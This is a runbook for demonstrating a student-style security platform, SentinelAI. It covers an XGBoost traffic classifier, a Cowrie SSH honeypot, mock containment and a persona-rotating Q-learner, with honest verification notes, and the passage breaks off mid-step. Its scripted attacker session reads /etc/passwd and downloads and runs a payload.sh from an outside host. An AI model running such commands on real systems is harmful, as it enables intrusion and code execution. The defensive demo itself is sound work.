# SentinelAI Threat Demonstration Runbook (Demo A: Honeypot Intelligence, Demo B: AI Threat Detection, Demo C: Autonomous Incident Response)

> **Short, verified operator procedure (2026-11-02): [`DEMO_ABC_RUNBOOK.md`](DEMO_ABC_RUNBOOK.md).** This file keeps the
> talk track, examiner questions and honesty table; where they disagree, the newer runbook and its evidence win.

Audited and run on 2026-10-22 (IST) on this laptop. Everything marked **[RUN]** was executed today and the output is pasted unedited (excerpted where long, never altered). **[CODE]** = verified by reading the file only. **NOT RUN** = expected output unverified.

> **Update 14:30 (see `docs/DEMO_READINESS_REPORT.md`, which supersedes this file where they differ):** v3 rules are committed and were verified live (download-only → RCE 0.91, no block; with `chmod +x` + `./payload.sh` → 0.99, blocked). The deployed Cowrie now listens on 127.0.0.1, which can never be auto-blocked: bind it to the WSL IP for Part C (report §5). Restart your :8000 engine: it predates v3 and its deception scorer returns 500. The dashboard now shows the persona Cowrie reports, and no Block IP button on already-blocked threats.

Isolation used for the runs: AI engine replays used the `/predict/eval` endpoint (no side effects). Backend runs used a **separate backend on port 5055** with a throwaway DB `sentinel-runbook-verify-20261022` and a generated test admin. Your own `sentinel-db`, your backend on :5000 and your engine on :8000 were not written to. Cowrie in WSL was restarted (see Part 7).

> **Read first: three things changed what you can safely demo**
> 1. **The served model is XGBoost (`xgb_cicids_v1`), not Random Forest.** The replay banner still says "Production Random Forest Model". Don't read the banner aloud.
> 2. **The Cowrie blocker used to block nothing when Cowrie ran as a daemon (`cowrie start`): its sync thread died when `twistd` forked. This is fixed** (sync thread now starts from `reactor.callWhenRunning`). It was re-verified end to end in daemon mode on 2026-10-22 13:07, and the fixed plugin is deployed in WSL. If the plugin in WSL is ever replaced by an older copy, the bug returns: compare sha256 with the repo.
> 3. **Honeypot rules are being edited right now (v2 → v3).** `utils/features.py` and `inference/predictor.py` changed at 12:53–12:56 today, uncommitted. Your running engine on :8000 (started 12:32) still has **v2** loaded. Under **v3**, `wget` alone no longer auto-blocks; the attacker must also run something (`chmod +x … ; ./payload.sh`). Restart the engine before the demo and use the v3 attack script in Part 3.

---

## PART 0: Answers to the must-resolve questions

### Q1. Model metrics

| Question | Answer | Evidence |
|---|---|---|
| 98.43% / 0.9862: before or after the time-of-day fix? | **Before.** `rf_classifier_cicids_v2_meta.json` has `trained_at: 2026-08-09T08:52:37`. The `(0,0)` time fallback first appears in git at `796fc56` (2026-10-18; history starts at a 2026-10-16 snapshot). It also predates de-duplication (`56352de`, 2026-10-21): the v2 meta has no `deduplicated`/`evaluation` keys, and `registry_history.jsonl` labels it "August RF, served until C2". **But the fix cannot have changed training:** time features were 0.0 for every training row, because CICIDS CSVs have no Timestamp column. The fix only changed inference. | [RUN] `CSV has Timestamp column: False`; `prepared sin/cos unique: [0.] [0.]` |
| Hour sin/cos still in the 53-feature vector? | **Yes**, positions 52–53 (`utils/features.py` `FEATURE_NAMES`; listed in `KNOWN_ABSENT_FEATURES`). They are dead features. | [RUN] served XGB: `clf scaler var sin/cos: 0.0 0.0`, `XGB importance sin/cos/entropy: 0.0 0.0 0.0634`, `IF scaler var sin/cos: 0.0 0.0` |
| Split | **Stratified random 80/20, `random_state=42`**, row-level, *not* chronological (`training/train.py` `train()`: `train_test_split(X, y, test_size=0.2, random_state=42, stratify=y)`). Chronological and leave-one-day-out are separate evaluations (`evaluation/day_holdout_eval.py`). | meta `evaluation.split: "stratified_random_80_20"`, `independent_holdout: false` |
| Duplicates removed before split? | **For the served XGB and RF v3: yes** (`drop_duplicate_rows` runs before the split). 148,015 → 124,534 rows (23,481 removed; 33 vectors carry two labels and are kept). **For the 98.43% RF v2: no.** | meta `deduplication`; [RUN] re-score: `test rows with an identical feature vector in train: 15 (0.1%)`, all Port Scan (11.3% of 71) |
| Classes and merges | 11 class slots, **10 with training data** (Data Exfiltration has none; honeypot rules only). Merges: **DDoS** ← DDoS, DoS Hulk, DoS GoldenEye, DoS slowloris, DoS Slowhttptest. **Credential Stuffing** ← FTP-Patator + Web Attack Brute Force. **RCE Attempt** ← Heartbleed (memory disclosure, not RCE). **Lateral Movement** ← Infiltration. **Malware Beacon** ← Bot. **SSH Brute Force** ← SSH-Patator. **Port Scan** ← PortScan. SQL Injection and XSS are 1:1. Too little data: SQLi 17 train / 4 test, RCE 9 / 2, Lateral 29 / 7. | `xgb_classifier_xgb_cicids_v1_meta.json` `label_sources`, `class_counts` |

### Q2. Replay timestamp and payload_entropy

- `demo/replay_cicids.py` `run_replay()` sets `payload["timestamp"] = datetime.now(timezone.utc).isoformat()`. `extract_features_from_record()` → `compute_time_of_day()` turns that into **non-zero** sin/cos at serve time, while training had 0.0. That is a real train/serve mismatch, **but it has no effect** on the served models: zero variance and zero importance. **[RUN]** For 6,000 DDoS+PortScan rows, every hour 0–23 gave `max |dProba| over 24 hours=0  max |dIFscore|=0`.
- `payload_entropy` is **not payload entropy**. It is the binary entropy of the forward-vs-backward byte share, `-p_f·log2 p_f - p_b·log2 p_b` with `p_f = fwd_bytes/(fwd+bwd)` (`compute_payload_entropy`, and the vectorised copy in `prepare_features`). It was **not constant** in training: **[RUN]** train mean 0.5372, variance 0.1648, range 0–1, XGB importance 0.0634. It is computed the same way at train and serve, so there is no skew. Call it "byte-direction balance", never "payload entropy".

### Q3. Sample selection

`load_curated_sample()` [CODE]:
- **No randomness and no seed.** It reads the CSV in file order in 25,000-row chunks. **[RUN]** Two calls return identical rows (`deterministic: True`).
- BENIGN: the first `rows//2` benign rows in the file.
- Attacks: the first rows of the first chunks that contain **at least 20 attack rows** ("sustained attack phase"), then round-robin across attack classes.
- It does **not** filter on model confidence or difficulty, so it is not cherry-picked for easy rows. But it is **not a random sample** either: early, sustained-burst rows of one capture day.

Overlap with training (**[RUN]**, `scratchpad/membership.py`, using `reproduce_reported_metrics.capture_split`):

| Run | Never seen in train or test | In training split | In test split |
|---|---|---|---|
| 10-row default (DDoS file) | 8 | 1 | 1 |
| 200-row DDoS file | 162 (68 benign + 94 DDoS) | 30 | 8 |
| 200-row PortScan file | 140 (68 benign + 72 PortScan) | 45 | 15 |

"Never seen" rows were not drawn by train.py's per-file caps. They are unseen rows, but from the *same capture day and attack tool* as training rows.

Results: (a) 10 rows: **10/10**. (b) 200 rows unpaced: **DDoS file 198/200 (99.00%)**, **PortScan file 196/200 (98.00%)**. Mismatches in Part 3 B3.

### Q4. Hybrid threat score (`inference/predictor.py`)

```python
# _assemble()
max_p = float(max(proba))
is_anomaly = if_score < ANOMALY_THRESHOLD                 # -0.55
rf_s   = max_p if cname != "BENIGN" else (1 - max_p)
if_sig = self.calculate_if_anomaly_signal(if_score)
score  = round(combine_threat_score(rf_s, if_sig, cname != "BENIGN"), 4)
if cname == "BENIGN" and is_anomaly:
    cname = "Unknown"; score = max(score, 0.55)
    review = if_sig >= REVIEW_MIN_SIGNAL                   # 0.55
...
action = "BLOCK" if score>=BLOCK_THRESHOLD else "MONITOR" if score>=MONITOR_THRESHOLD else "ALLOW"
if review and action == "ALLOW": action = "REVIEW"

def anomaly_signal(if_score):   # 0 above -0.55, linear to 1 over a 0.20 span below it
    sig = np.where(np.isfinite(s) & (s < ANOMALY_THRESHOLD),
                   np.minimum((ANOMALY_THRESHOLD - s) / IF_ANOMALY_SPAN, 1.0), 0.0)

def combine_threat_score(rf_s, if_sig, is_attack):
    blend = 0.7 * rf_s + 0.3 * np.asarray(if_sig, dtype=float)
    score = np.where(is_attack, np.maximum(rf_s, blend), blend)
```

- Thresholds: **BLOCK ≥ 0.92**, **MONITOR (alert line) ≥ 0.90**, `ANOMALY_THRESHOLD = -0.55`, `REVIEW_MIN_ANOMALY_SIGNAL = 0.55`. All four are env-overridable. **[RUN]** `/model/info` → `"thresholds": {"block": 0.92, "monitor": 0.9, "anomaly": -0.55, "reviewMinAnomalySignal": 0.55}`.
- Actions: **ALLOW / MONITOR / BLOCK / REVIEW**. `main.py` `_input_policy()` downgrades BLOCK → MONITOR when more than 5 features were defaulted (`incompleteInput`).
- Severity: CRITICAL ≥ 0.92, HIGH ≥ 0.90, MEDIUM ≥ 0.50, else LOW (`score_to_severity`).
- **Inconsistencies to resolve aloud:** (1) The formula is *not* simply "0.7·RF + 0.3·IF". For attack classes the classifier confidence is a floor, so the IF can only raise the score. (2) `replay_cicids.py` prints "scores >= 0.7 raised as live threats", and its meter turns yellow at 0.70. The real alert line is **0.90**. The 0.7 is stale. (3) The `rf_s` name is historical; the classifier is XGBoost.
- Honeypot sessions don't use this formula. They use `HONEYPOT_RULE_SCORES` plus 0.01 per command, capped at 0.99 (`predict_from_honeypot`).

### Q5. Containment reality

| Question | Answer | Evidence |
|---|---|---|
| `autoBlockEnabled` default | **OFF.** If the setting doc is missing, `threatController.getSettings` creates it with `value: false`, and every reader treats missing as false (`threatService.js`, `aiService.js`, `honeypotService.js`: `setting ? setting.value === true : false`). Turn it on with Admin → Settings (`Settings.jsx`) or `POST /api/threats/settings`. | [RUN] `before: ('admin', False)` → `POST 200 … "autoBlockEnabled":true` |
| OS firewall adapter | **MOCK by default.** `adapterFactory.getContainmentAdapter` uses `CONTAINMENT_BACKEND \|\| 'mock'`. Real netsh needs `CONTAINMENT_BACKEND=windows-firewall` **and** `ENABLE_REAL_WINDOWS_FIREWALL_ENFORCEMENT=true`, and admin rights. Neither is set in `backend/.env`. Earlier evidence docs report `SentinelAI-Rule-*` count = 0 every time. It has **never run live.** | [RUN] every `ContainmentAction`: `enforcementBackend: 'mock'`, `adapterName: 'MockContainmentAdapter'`, `stdout: 'Mock containment rule … applied'` |
| Only verified enforcement? | **Yes:** `honeypot/cowrie/sentinelblocker.py`. `patch_ssh()` replaces `CowrieSSHFactory.buildProtocol` and returns `None` for IPs on the deny-list (`GET /api/honeypot/ingest/check-block`, pulled every `SYNC_INTERVAL = 2.0` s). The TCP handshake completes, then Twisted closes the socket before the SSH banner. It protects **only the honeypot port 2222**. | [RUN] Part 3 C2 |
| **Blocker bug found and fixed today** | Before: `start()` started the sync thread inside `Output.__init__`, before `twistd` daemonized. After the fork the daemon had **1 thread** and an empty deny-list. Fix: `start()` now calls `reactor.callWhenRunning(self._start_sync_thread)`, so the thread is created in the post-fork process. Regression test: `ai-engine/tests/test_cowrie_blocker_plugin.py::test_sync_thread_starts_only_when_the_reactor_runs` (fails on the old plugin, passes on the new one; 11/11 blocker + config-contract tests pass). | [RUN] before fix: daemon `threads: 1`, reconnect `ACCEPTED (not blocked)`. After fix, **daemon** PID 1082: `threads: 2`, real session `RCE Attempt 0.99` → `BlockedIP 172.29.32.1` (07:37:48) → reconnect `Error reading SSH protocol banner`, Cowrie log `rejected (SSH)` (07:37:57) |
| iptables/ipset/netsh executed? | **No.** netsh lives in `WindowsFirewallAdapter.js` via `execFile` and is gated off. iptables appears only in `honeypot/docker/egress-rules.sh` and `honeypot/redirect-ssh-port.sh`, which the app never calls (the Docker stack has never run; no Docker on this machine). No ipset anywhere. | grep + env |
| Loopback | `containmentPolicyService.js` `PROTECTED_IPV4_PATTERNS` refuses 127/8, 0.0.0.0, broadcast, multicast and 169.254/16. **An attacker on 127.0.0.1 can never be blocked.** Attack Cowrie via the WSL IP, not localhost. | [CODE] |

### Q6. Is containment driven by real detection?

**Yes, no injected event is needed.** **[RUN]** A real Cowrie session (login, `whoami`, `uname -a`, `cat /etc/passwd`, `wget …`) was rule-classified **RCE Attempt 0.98** (v2 rules), auto-blocked and then refused on reconnect (foreground Cowrie). Caveats:
- It is a **rule** verdict (`classify_honeypot_session`), not ML.
- Under **v3** rules (on disk now), wget alone → **RCE 0.91 → MONITOR, no block**. Adding `chmod +x payload.sh` and `./payload.sh` → **RCE 0.99 → BLOCK** ([RUN] on a v3 engine on port 8001).
- The block is a **mock** containment record plus real **honeypot-level** refusal. There is no host firewall change.

### Q7. Backend replay (`--target backend`) **[RUN]**

10 flows → MongoDB: **10 `aipredictions`** (`modelVersion: 'xgb_cicids_v1'`), **5 `threatlogs`** (DDoS, CRITICAL, `status: 'BLOCKED'`, `mitreTechniques: [{id:'T1498', name:'Network Denial of Service'}]`, `autonomousAction.taken: true`), **5 `blockedips`** (`reason: 'AI Engine auto-block (score = 1)'`), **5 `containmentactions`** (mock, ACTIVE, 1 h expiry), **10 `alerts`**. Benign flows created no threat.

Socket.IO **[RUN]** (`scratchpad/socket_probe.js`, admin socket after `join_room`): `ai_prediction`, `ip_blocked`, `live_feed_event`, `new_alert`, `new_threat`, `critical_alert`, `threat_intel_updated` (AbuseIPDB `PRIVATE_IP` → UNAVAILABLE).

### Q8. Does the Q-learner change what Cowrie returns?

**Not by itself, but the rotator does, and it is verified (2026-11-12, PRs #26–#28).** The scorer (`rl_engine/deception_scorer.py`) only recommends. It returns `"recommendationApplied": False`. The backend persists one PENDING decision per served persona.

`honeypot/deception_rotator.py` applies a decision as follows:
1. It rewrites `cowrie.cfg` (banner, hostname, kernel, per-persona filesystem) and restarts Cowrie, which drops live sessions. That is why it waits while attacker sessions are open.
2. It then requires proof that the persona is really served: the connection it opened before the restart must have dropped, and Cowrie must answer with the new SSH banner.
3. Only then does it record the decision **APPLIED**. Otherwise it restores the old `cowrie.cfg` and records **FAILED**.

You trigger it by hand in the demo (A5). A supervised, disabled-by-default systemd service (`scripts/rotator/`) can run it every N minutes. It was verified end to end on an isolated copy, but it is **not enabled** on the demo install.

Earlier HTTP 500s from the :8000 engine on `/deception/score` no longer occur (integration A-live). Still start the engine with `Q_TABLE_PATH` set (Part 2), or use `scripts/demo/start-demo.ps1`, which does that.

---

## PART 1: Reality matrix

| Component | Files/functions | Status | Evidence |
|---|---|---|---|
| Cowrie SSH honeypot (WSL, port 2222, ubuntu_22 persona) | WSL `~/sentinelai-cowrie-test/cowrie`, `cowrie.cfg` | **WORKING (I ran it)** | banner `SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6`, `uname -a` → `ubuntu-prod-srv 5.15.0-91-generic` |
| Log parser → backend ingest | `honeypot/parsers/log_parser.py` `tail`/`process`/`post` | **WORKING (I ran it)** | 5 sessions acknowledged, commands with intents |
| Command intent + MITRE mapping | `backend/utils/mitreMapping.js`, `honeypotService.recordSessionActivity` | **WORKING (I ran it)** | T1003, T1003.008, T1033, T1082, T1105, T1595 on the session |
| Session classification | `utils/features.py` `classify_honeypot_session`, `predictor.predict_from_honeypot` | **WORKING (I ran it); rule-based, not ML**; v2/v3 in flux | `aiClassificationMethod: 'honeypot_rules'`, `aipredictions.modelType: ["rules"]` |
| HASSH campaign clustering | `backend/services/campaignService.js` (exact hassh **or** Jaccard ≥ 0.65 over ≥ 3 commands) | **WORKING (I ran it)** | `CAMP-B1DC0807`, 4 sessions, hassh `6372ee6957562199b2fb773b0be1bf34`, `threatLevel CRITICAL` |
| Persona attribution from Cowrie cfg | parser `COWRIE_CFG` → collector | **WORKING (I ran it)** | `servedProfile: 'ubuntu_22'` + warning "crediting ubuntu_22" |
| Q-learning persona scorer | `rl_engine/deception_scorer.py` | **WORKING**: scored live sessions; Q-table persisted (integration A / A-live, 2026-11-02); the earlier :8000 500 no longer occurs | `scripts/integration/runs/20261102_145846` |
| Persona rotator | `honeypot/deception_rotator.py`, `scripts/demo/cowrie-demo-mode.sh rotate --once` | **WORKING (rehearsed 2026-11-12)**: on an isolated copy with the demo Q-table, the demo command applied the dashboard's pending decision `ubuntu_22 → centos_7` in ~9 s; SSH then showed `centos-web-gateway`, and the dashboard showed `Serving persona: centos_7`. It records APPLIED only after the restart is proven and the new banner is served; otherwise FAILED with cfg restored. Effectiveness vs a fixed persona not measured | PRs #26/#28, A5 |
| Automatic rotation service | `scripts/rotator/` (systemd user unit + `rotator-ctl.sh`) | **WORKING on an isolated copy, NOT ENABLED here**: 22 APPLIED decisions, all 5 Linux personas, deferral, restart failure and recovery, graceful stop and autostart all verified. WSL stops the distro when no WSL window is open, so it pauses then | PR #27/#28 |
| CICIDS replay, engine target | `demo/replay_cicids.py` `EngineTarget` → `/predict/eval` | **WORKING (I ran it)** | 10/10, 198/200, 196/200 |
| CICIDS replay, backend target | `BackendTarget` → `/api/ai/analyze` → `aiService.storePrediction` | **WORKING (I ran it)** | Q7 |
| XGBoost classifier (served) | `models/registry.json`, `predictor.load` (sha256 + 20-row golden check) | **WORKING (I ran it)** | `"verified": true, "goldenCheck": "20 golden rows reproduced"` |
| Isolation Forest + hybrid score | `anomaly_signal`, `combine_threat_score` | **WORKING (I ran it)** | "Unknown 0.55" verdicts in the 200-row runs |
| Random Forest | `rf_classifier_cicids_v3.pkl` | **Trained, NOT served** | registry |
| SHAP explanations | `predictor.explain_vector`, `GET /api/threats/:id/explanation`, `ExplanationModal.jsx` | **WORKING per threat (2026-11-03)**: on demand from the stored vector, verified to reproduce the stored class, score and model version (integration B, live replay); global view on AI Analytics; classifier only | integration `20261102_191411` |
| Auto-block decision | `aiService`, `honeypotService.analyseClosure`, `containmentService.executeAutoBlock` | **WORKING (I ran it)**, off by default | Q5 |
| Containment adapter | `containment/MockContainmentAdapter.js` | **MOCK** | `enforcementBackend: 'mock'` |
| Windows Firewall enforcement | `containment/WindowsFirewallAdapter.js` | **NOT IMPLEMENTED in practice** (code exists, gated off, never run live) | env + docs |
| Honeypot-level drop on reconnect | `honeypot/cowrie/sentinelblocker.py` `patch_ssh`, `_start_sync_thread` | **WORKING (I ran it)** in daemon and foreground mode (daemon fixed today) | Q5 |
| Socket.IO live dashboard | `websocket/socketManager.js` | **WORKING**: protocol level (integration B/D: 15 `new_threat` for 15 threats, reconnect after a backend restart) and in browsers (Playwright `realtime.spec.js`, Chromium/Firefox/WebKit, 2026-11-02) | integration + E2E |
| Docker honeypot stack, iptables egress | `honeypot/docker-compose.honeypot.yml`, `egress-rules.sh` | **NOT IMPLEMENTED (never run)** | no Docker installed |
| Mock AI engine | `scratch/mock_ai_engine.js` (old runbook "Option B") | **MOCK**: never use it for the threat demo | — |
| `log_parser.py --demo`, `npm run seed` | `demo-*` sessions | **MOCK** (badged in UI) | — |
| File download capture | parser `on_download` | **PARTIAL**: wget is logged, but Cowrie never fetched anything (no DNS/egress) | "unable to resolve host address" |

---

## PART 2: Pre-demo setup (Windows + WSL, no Docker)

Docker is **not installed**, so `docker compose` commands do not apply. Everything runs natively.

**IPs are dynamic.** Today WSL eth0 = `172.29.32.17` and the Windows host as seen from WSL = `172.29.32.1`. Re-read them after every reboot:

```bash
wsl -d Ubuntu -- hostname -I
```
```bash
wsl -d Ubuntu -- ip route show default
```
Below, `<WSL_IP>` is the first value and `<WIN_IP>` is the `via` address of the second.

### Terminal 1: MongoDB (already a Windows service)
```bash
powershell -c "Get-Service MongoDB"
```
Expected: `Running`.

### Optional but recommended: a clean demo database
Don't wipe `sentinel-db` (it holds your users). Run the demo against a dedicated DB and bootstrap its admin with `ADMIN_INITIAL_PASSWORD` (`config/db.js` `ensureDefaultAdmin`), exactly as I did for verification. To reset it between rehearsals:
```bash
mongosh --quiet "mongodb://127.0.0.1:27017/sentinel-demo" --eval "db.dropDatabase()"
```
(Re-enable auto-block after every reset: the setting lives in that DB.)

### Terminal 2: AI engine (restart it, so it loads the current v3 rules)
Your current engine was started with system `Python311` at 12:32. Stop it (Ctrl+C in its window), then in PowerShell:
```powershell
cd <repo>\ai-engine
$env:Q_TABLE_PATH = "$env:USERPROFILE\.sentinelai\q_table.json"
.\.venv\Scripts\python.exe -m uvicorn inference.main:app --host 127.0.0.1 --port 8000 --env-file ..\backend\.env
```
Health checks (open in browser tab 1):
- `http://127.0.0.1:8000/health` → `{"status":"ok",...}` [RUN]
- `http://127.0.0.1:8000/ready` → `{"status":"ok"}` [RUN]
- `/model/info` needs the `X-API-Key` header. Expect `rfVersion: xgb_cicids_v1`, `"verified": true`, `goldenCheck: "20 golden rows reproduced"` [RUN]

### Terminal 3: Backend, bound so that WSL can reach it
The Cowrie blocker inside WSL cannot reach `127.0.0.1` on Windows (WSL NAT). Bind the backend to `<WIN_IP>`:
```powershell
cd <repo>\backend
$env:HOST = "172.29.32.1"        # <WIN_IP>; tested today
# $env:MONGO_URI = "mongodb://127.0.0.1:27017/sentinel-demo"   # if using a demo DB
node server.js
```
Expected: `SentinelAI Backend ready on port 5000` [RUN, on port 5055]. Health: `http://172.29.32.1:5000/health` → `{"status":"ok"}`. (`/api/health` is a 404; the route is `/health`.)
From WSL, `curl -s -o /dev/null -w "%{http_code}" http://172.29.32.1:5000/api/auth/csrf -H "Origin: http://localhost:3000"` should print `200` [RUN].

### Terminal 4: Frontend, proxied to that address
```powershell
cd <repo>\frontend
$env:SENTINEL_DEV_API_PROXY = "http://172.29.32.1:5000"
npm run dev
```
`vite.config.js` reads `SENTINEL_DEV_API_PROXY` for `/api` and `/socket.io` [CODE]. Browser use with this proxy: **NOT RUN**.

### Terminal 5 (WSL): Cowrie
```bash
cd ~/sentinelai-cowrie-test/cowrie && export PATH=~/sentinelai-cowrie-test/env/bin:$PATH
export HONEYPOT_API_KEY='<same value as backend/.env HONEYPOT_API_KEY>'
export SENTINEL_API_URL=http://172.29.32.1:5000/api
cowrie stop; rm -f var/run/cowrie.pid
COWRIE_STDOUT=yes cowrie start      # foreground: shows the blocker lines live (good to point at)
# or: cowrie start                  # daemon: also blocks since the fix; watch with  tail -f var/log/cowrie/cowrie.log
```
The env vars must be set in the shell that starts Cowrie: the blocker reads them at start. Expected [RUN]: `[SentinelAI] Non-blocking blocker plugin loaded and connection factories patched successfully.` and `Ready to accept SSH connections`. Sanity check in daemon mode: `ls /proc/$(cat var/run/cowrie.pid)/task | wc -l` should print **2** (1 means the old, unfixed plugin is deployed).

### Terminal 6: Parser (Windows)
```powershell
$env:HONEYPOT_API_KEY = "<same key>"
$env:SENTINEL_API = "http://172.29.32.1:5000/api"
$env:PARSER_STATE_DIR = "$env:USERPROFILE\.sentinelai\cowrie-parser"
$env:COWRIE_CFG = "\\wsl.localhost\Ubuntu\home\<wsl-user>\sentinelai-cowrie-test\cowrie\etc\cowrie.cfg"
<repo>\ai-engine\.venv\Scripts\python.exe <repo>\honeypot\parsers\log_parser.py --live --log "\\wsl.localhost\Ubuntu\home\<wsl-user>\sentinelai-cowrie-test\cowrie\var\log\cowrie\cowrie.json"
```
Expected [RUN]: `Persona source: …cowrie.cfg (now serving ubuntu_22)`, then `Tailing … -> http://172.29.32.1:…/api`.

### Terminal 7: attacker (Windows PowerShell). Terminal 8: replay (ai-engine folder).

### Settings to set
1. Log in as admin → **Settings → Auto-block ON** (or `POST /api/threats/settings {"autoBlockEnabled": true}`).
2. **Unblock the attacker IP** (`<WIN_IP>`) left over from rehearsals: Blocked IPs page, or `POST /api/threats/unblock-ip` (analyst/admin) [CODE]. Otherwise the very first SSH connection is dropped.
3. Leave `HONEYPOT_AUTOBLOCK_MODE` unset. `approve` would stop the auto-block. The hourly honeypot auto-block cap also applies (`honeypotAutoBlockBudgetSpent`).

### Browser tabs
1. Engine `/health`. 2. Dashboard (Live feed). 3. Honeypot Analytics. 4. Threats list. 5. Blocked IPs / Containment. 6. (Optional) MongoDB Compass on the demo DB.

---

## PART 3: Step-by-step threat demo

### A. Demo A — Honeypot Intelligence (live Cowrie SSH attack)

**A1. Show the honeypot is up.** Point at Terminal 5 ("Ready to accept SSH connections") and the Honeypot Analytics tab.
*Say:* "This is Cowrie, a medium-interaction SSH honeypot, running in WSL on port 2222. It pretends to be an Ubuntu 22.04 server. Nothing an attacker types here runs on a real operating system: Cowrie answers every command from a fake filesystem."

**A2. Password guessing.** Terminal 7:
```bash
ssh -p 2222 root@172.29.32.17
```
Type two wrong passwords, then Ctrl+C. (I drove this with paramiko, `scratchpad/attacker.py brute`; the Windows `ssh` client path is NOT RUN.)
Real output [RUN]:
```
12:53:00 login root/<guess> -> Permission denied
12:53:01 login root/<guess> -> Permission denied
```
Parser [RUN]: `SSH session opening acknowledged: e01416fe140f from 172.29.32.1` / `SSH client hassh: e01416fe140f -> 6372ee6957562199b2fb773b0be1bf34`.
Background: Cowrie `cowrie.login.failed` → `log_parser.py` `on_kex` (SESSION_OPENED) and `on_closed` → `POST /api/honeypot/ingest/*` → `session_collector` → `honeypotService` → AI engine `/predict/honeypot/internal` → `classify_honeypot_session`.
Verdicts: v2 (today's run) → `SSH Brute Force 0.9` per single failure. **v3 (what you'll run) → `SSH Intrusion Attempt 0.75`** until ≥ 5 failures from that source (`BRUTE_FORCE_MIN_FAILURES`) [RUN on :8001].
*Say:* "Every failed login is recorded with the client's HASSH fingerprint, a hash of its SSH key-exchange preferences. Passwords are redacted before they reach the database. A single wrong password is only an intrusion attempt. It takes five failures from one source to call it brute force."

**A3. Log in and act like an attacker.**
```bash
ssh -p 2222 root@172.29.32.17
```
Password `123456` (from `honeypot/cowrie/userdb.txt`; note that root also accepts `admin`). Then type:
```bash
whoami
uname -a
cat /etc/passwd | head -3
wget http://198.51.100.50/payload.sh
chmod +x payload.sh
./payload.sh
exit
```
Real output [RUN] (first five commands; `chmod`/`./payload.sh` were added after the v3 change and are verified only through the engine on :8001):
```
12:53:13 login root/123456 -> shell; server banner: SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6
$ whoami        -> root
$ uname -a      -> Linux ubuntu-prod-srv 5.15.0-91-generic #101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023 x86_64 GNU/Linux
$ cat /etc/passwd | head -3 -> root:x:0:0:root:/root:/bin/bash ...
$ wget http://198.51.100.50/payload.sh
    Resolving 198.51.100.50 (198.51.100.50)... failed: Temporary failure in name resolution.
    wget: unable to resolve host address '198.51.100.50'
```
Parser [RUN]: `Command [RECONNAISSANCE]` ×2, `Command [CREDENTIAL_HARVEST]`, `Command [MALWARE_DOWNLOAD]`, `Session closed: e60d58700c67 (9.162s)`.
MongoDB `honeypotsessions` [RUN]:
```
sessionId: 'e60d58700c67', hassh: '6372ee69…', commandCount: 5, aiClassification: 'RCE Attempt',
aiThreatScore: 0.98, aiClassificationMethod: 'honeypot_rules', servedProfile: 'ubuntu_22',
mitreTechniques: T1003, T1003.008, T1033, T1082, T1105, T1595
```
Expected under v3 with `chmod` + `./payload.sh` (7 commands): `RCE Attempt 0.99 BLOCK` [RUN on :8001].
Background: `on_cmd` → `/ingest/command` → `recordSessionActivity` (IOCs, `mitreMapping.js`, deception score) → Socket.IO `honeypot_command`. On close: `/ingest/close` → `analyseClosure` → rules → ThreatLog reclassified to CRITICAL → auto-block check → `/deception/score` → `campaignService` clustering → `honeypot_session_closed`.
*Pause and point:* the MITRE technique chips on the session, and the wget error in the terminal. Be ready for "why did wget fail?" (below).
*Say:* "Each command is tagged with an intent and mapped to MITRE ATT&CK: `whoami` is T1033 System Owner Discovery, `/etc/passwd` is T1003 Credential Dumping, `wget` is T1105 Ingress Tool Transfer. When the session closes, a transparent rule set classifies it. This one fetched and ran a payload, so it's an RCE attempt at 0.99. That is above our 0.92 block line."

**A4. HASSH campaign clustering.** Open the Campaigns view or `GET /api/honeypot/attackers`.
Real [RUN]: `campaignId: 'CAMP-B1DC0807'`, 4 sessions, `sourceIPs: ['172.29.32.1']`, `threatLevel: 'CRITICAL'`, `maxAiThreatScore: 0.98`.
*Say:* "All four connections, the failed guesses and the shell session, share one HASSH fingerprint, so they're grouped into one campaign. The rule is an exact HASSH match, or at least 65% command overlap. HASSH identifies the client software, not the person: two attackers using the same SSH library would also match."

**A5. Adaptive deception: the Q-learner picks the next persona, the rotator applies it (≈ 90 s).** Rehearsed on an isolated copy with your demo Q-table, 2026-11-12.

*Before you start:*
- Cowrie must be the **daemon** started by `cowrie-demo-mode.sh on` (the rotation restarts it, and a foreground `COWRIE_STDOUT=yes` Cowrie in Terminal 5 would simply be replaced).
- A3's session must have **closed**. Otherwise the rotator defers, because it refuses to restart under an open attacker session.

1. **Show the recommendation.** Honeypot Analytics → *Adaptive Deception* panel (scroll down; click **Refresh**). Expected [RUN]:
   ```
   Serving persona: ubuntu_22 (from setting)
   Q-learner recommends: Switch ubuntu_22 → centos_7 (best known Q-value).
   N updates from scored sessions; 12087 inherited from a synthetic warm start, not attacker data
   Decision …<8 hex> (already pending): reused for this persona until the rotator applies it or it expires
   ```
   (N is 12 in your demo Q-table today plus the sessions scored during A2/A3. About 1 time in 20 the learner explores and recommends another persona; say "this one is an exploration pick", since the panel labels it.)
   *Say:* "Every session you just watched was scored for engagement: how long the attacker stayed, what they ran, and whether they probed for a honeypot. Those scores update a tabular Q-learning model whose actions are server personas. It has drawn one decision: switch from Ubuntu to CentOS. Note the honest label underneath. Most of what it knows comes from a synthetic warm start, not from real attackers."

2. **Apply it.** In a WSL terminal, from the repo folder (`/mnt/c/Users/srisn/Desktop/Projects/sentinelai-complete`):
   ```bash
   bash scripts/demo/cowrie-demo-mode.sh rotate --once
   ```
   It takes about 9 s. Expected [RUN] (log lines first, then the generator's summary; the IP is your `<WSL_IP>` when demo mode is on):
   ```
   [INFO] Switching persona ubuntu_22 -> centos_7
   [INFO] Rotation result: {'changed': True, 'active': 'centos_7', 'previous': 'ubuntu_22', 'decisionId': '<same id as the panel>'}
   [+] Active Profile: CENTOS_7   Hostname: centos-web-gateway   Banner: SSH-2.0-OpenSSH_7.4
   persona now: centos_7
   cowrie      : cowrie is running (PID: …)
   threads     : 2  (2 = blocker sync thread alive)
   check-block : HTTP 200
   ```
   *Say:* "The rotator applied exactly the decision shown on the dashboard. It rewrote Cowrie's configuration and restarted it. Before recording anything, it checked two things: the connection it held open before the restart was dropped, which proves Cowrie really restarted, and Cowrie now answers with the CentOS SSH banner. Only then is the decision marked applied. If either check fails, it restores the old configuration and marks the decision failed."

3. **Show that the attacker now sees a different server.** A3's auto-block has deny-listed the Windows host's address, so a reconnect from Windows would be refused. Connect from **inside WSL**, which is a different source address:
   ```bash
